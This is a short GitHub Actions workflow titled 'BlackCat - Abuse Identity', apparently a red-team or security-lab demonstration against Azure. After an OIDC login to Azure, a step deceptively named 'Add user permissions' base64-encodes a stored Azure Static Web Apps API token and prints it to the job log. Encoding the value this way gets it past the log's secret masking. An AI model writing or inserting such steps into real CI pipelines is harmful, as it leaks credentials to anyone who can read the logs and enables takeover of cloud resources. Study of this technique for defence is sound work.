name: BlackCat - Abuse Identity
on: [workflow_dispatch]

permissions:
      id-token: write
      contents: read
      
jobs: 
  ubuntu-latest:
    runs-on: ubuntu-latest
    steps:
      - name: Login to Azure
        uses: Azure/Login@v2
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }} 
          enable-AzPSSession: true

      - name: 'Add user permissions'
        uses: azure/powershell@v2
        with:
          inlineScript: |
                $encoded  = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN_VICTORIOUS_FIELD_0732F750F }}"))
                # auth headers
      
                write-host "Base64 value is..."
                write-host "$encoded"
                
